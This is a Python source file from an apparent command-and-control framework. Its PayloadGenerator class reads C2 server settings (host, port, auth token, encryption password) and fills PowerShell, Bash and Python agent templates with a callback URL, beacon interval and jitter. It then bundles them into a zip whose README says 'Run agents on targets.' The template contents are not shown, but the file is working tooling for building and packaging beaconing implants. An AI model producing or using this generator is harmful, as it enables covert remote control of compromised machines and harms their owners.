import json
import os
import shutil
import sys
import zipfile
from datetime import datetime
from .templates.powershell import POWERSHELL_TEMPLATE
from .templates.bash import BASH_TEMPLATE
from .templates.python import PYTHON_TEMPLATE

class PayloadGenerator:
    def __init__(self, config_file='config/c2_config.json'):
        try:
            with open(config_file, 'r') as f:
                self.config = json.load(f)
        except FileNotFoundError:
            print("[!] config/c2_config.json not found. Run C2 server first.")
            sys.exit(1)

        host = self.config['server']['host']
        port = self.config['server']['port']
        use_ssl = self.config['server']['use_ssl']
        protocol = 'https' if use_ssl else 'http'
        self.server_url = f"{protocol}://{host}:{port}"
        self.auth_token = self.config['authentication']['auth_token']
        self.encryption_password = self.config['c2']['encryption_password']

    def _generate_file(self, template: str, output_file: str, interval: int, jitter: int):
        content = template.format(
            server_url=self.server_url,
            auth_token=self.auth_token,
            encryption_password=self.encryption_password,
            beacon_interval=interval,
            jitter=jitter
        )
        with open(output_file, 'w') as f:
            f.write(content)
        print(f"[+] Generated: {output_file}")

    def generate_powershell_agent(self, output_file: str, interval: int = 60, jitter: int = 30):
        self._generate_file(POWERSHELL_TEMPLATE, output_file, interval, jitter)

    def generate_bash_agent(self, output_file: str, interval: int = 60, jitter: int = 30):
        self._generate_file(BASH_TEMPLATE, output_file, interval, jitter)
        os.chmod(output_file, 0o755)

    def generate_python_agent(self, output_file: str, interval: int = 60, jitter: int = 30):
        self._generate_file(PYTHON_TEMPLATE, output_file, interval, jitter)
        os.chmod(output_file, 0o755)

    def generate_all_agents(self, interval: int = 60, jitter: int = 30):
        self.generate_powershell_agent("agents/agent.ps1", interval, jitter)
        self.generate_bash_agent("agents/agent.sh", interval, jitter)
        self.generate_python_agent("agents/agent.py", interval, jitter)

    def create_deployment_package(self):
        package_dir = "deployment_package"
        os.makedirs(package_dir, exist_ok=True)

        # Generate agents in package
        self.generate_powershell_agent(f"{package_dir}/agent.ps1")
        self.generate_bash_agent(f"{package_dir}/agent.sh")
        self.generate_python_agent(f"{package_dir}/agent.py")

        # Add docs
        with open(f"{package_dir}/README.txt", 'w') as f:
            f.write("C2 Agents Deployment\n\nRun agents on targets.")

        # Zip it
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        zip_name = f"c2_agents_{ts}.zip"
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(package_dir):
                for file in files:
                    zipf.write(os.path.join(root, file), file)

        shutil.rmtree(package_dir)
        print(f"[+] Deployment package: {zip_name}")